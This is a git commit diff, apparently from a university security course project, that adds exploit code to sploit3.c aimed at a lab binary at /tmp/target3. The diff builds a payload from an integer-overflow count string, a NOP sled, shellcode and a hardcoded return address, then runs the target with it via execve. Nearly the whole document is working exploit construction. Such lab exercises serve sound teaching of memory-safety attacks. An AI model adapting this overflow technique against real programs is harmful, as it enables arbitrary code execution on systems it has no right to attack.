d95c832d973596784895b7a9912763d0ab46e61b
Zahan Malkani <zahanm@gmail.com>
2012-04-23 01:17:25 -0700

    making progress on sploit3, almost there

--- pp1/sploits/sploit3.c
+++ pp1/sploits/sploit3.c
@@ -6,12 +6,25 @@
 
 #define TARGET "/tmp/target3"
 
+struct widget_t {
+  double x;
+  double y;
+  int count;
+};
+static char payload[1001 * sizeof(struct widget_t) + 12]; // 12 == strlen(count)
+
 int main(void)
 {
   char *args[3];
   char *env[1];
+  char *count = "-2147482647,";
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(payload, count, strlen(count));
+  memset(payload + strlen(count), 0x90, sizeof(payload) - strlen(count));
+  memcpy(payload + sizeof(payload) - sizeof(struct widget_t) - sizeof(shellcode), shellcode, sizeof(shellcode));
+  *(int *)(payload + sizeof(payload) - sizeof(struct widget_t) + 4) = 0xbfff61f8;
+
+  args[0] = TARGET; args[1] = payload; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
